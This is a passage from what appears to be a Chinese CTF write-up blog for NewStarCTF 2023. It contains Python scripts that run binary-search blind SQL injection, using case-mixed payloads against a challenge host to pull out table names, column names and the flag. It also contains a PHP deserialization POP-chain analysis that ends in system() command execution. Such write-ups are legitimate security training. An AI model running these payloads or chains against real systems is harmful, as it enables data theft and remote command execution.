class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((sElect(GROUP_CONCAT(TABLE_NAME))frOm(infOrmation_schema.tables)wHere(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">第1张表的名字为grades,here_is_flag<br>[&#x27;grades,here_is_flag           &#x27;]<br></code></pre></td></tr></table></figure><p>爆表的字段:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_num存储每张表每个字段所对应的长度</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;here_is_flag第1字段的长度&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = [<span class="hljs-string">&#x27;here_is_flag&#x27;</span>]<br><span class="hljs-comment"># col_count存储每张表的字段数</span><br><span class="hljs-comment"># 将所有字段合在一起输出就是只有一个字段</span><br>col_count = &#123;<span class="hljs-string">&#x27;here_is_flag&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_name存储每张表的字段的名字</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先对表进行遍历,只有表F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># 当前表的名字:table_name[table_index]</span><br>    <span class="hljs-comment"># col_num存储当前表的字段数</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 对当前表的字段进行遍历，获取全部字段名，所以只有一个字段</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_key存储当前表当前字段的key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;第&#123;&#125;字段的长度&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_len存储当前字段的长度</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># 遍历当前字段</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># name存储当前字段的名称</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>            <span class="hljs-comment"># 从可打印字符开始</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 对第n个字符进行判断</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>                <span class="hljs-comment"># payload1:用于普通盲注</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((selEct(GROUP_CONCAT(COLUMN_NAME))frOm(infOrmation_schema.COLUMNS)wHere(TABLE_NAME=&#x27;here_is_flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.05</span>)<br>                <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>                true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># 返回true界面 </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 返回flase界面</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># 继续下一个字符</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 存储当前字段的名称:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;的第&#123;&#125;个字段的名字&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># 继续下一个字段</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一张表</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">here_is_flag的第1个字段的名字:flag<br>&#123;&#x27;here_is_flag的第1个字段的名字&#x27;: &#x27;flag                                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>爆字段的值:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;ctf&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;here_is_flag&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((seLEct(Group_cOncAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload3)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010215536171.png" alt="image-20231010215536171"></p><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//反序列化自动调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在字符串比较可以调用__toString()函数=&gt;$this-&gt;name=new Then()</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在类调用，可以用于启动__invoke()函数</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在可以指定类的函数end()函数调用</span><br>        <span class="hljs-comment">//$this-&gt;obj=new CTF()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//getStr为Handle类的不存在函数所以可以用于调用__call</span><br>        <span class="hljs-comment">//$this-&gt;obj=new Handle()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在变量删除函数可以调用魔术方法__unset</span><br>        <span class="hljs-comment">//$this-&gt;handle-&gt;log=$WhiteGod-&gt;$func</span><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在危险函数注入=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br><br></code></pre></td></tr></table></figure><p>pop链构造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.WhiteGod-&gt;__unset<br>2.CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>3.Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>4.Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>5.Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>6.Begin-&gt;__destruct=&gt;Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br></code></pre></td></tr></table></figure><p>魔术函数介绍:</p><p>__unset（）魔术方法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">__unset()魔术方法在使用unset()函数删除一个对象的属性时会自动调用。当一个对象的属性被unset时，如果该对象定义了__unset()方法，那么该方法会被自动调用。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 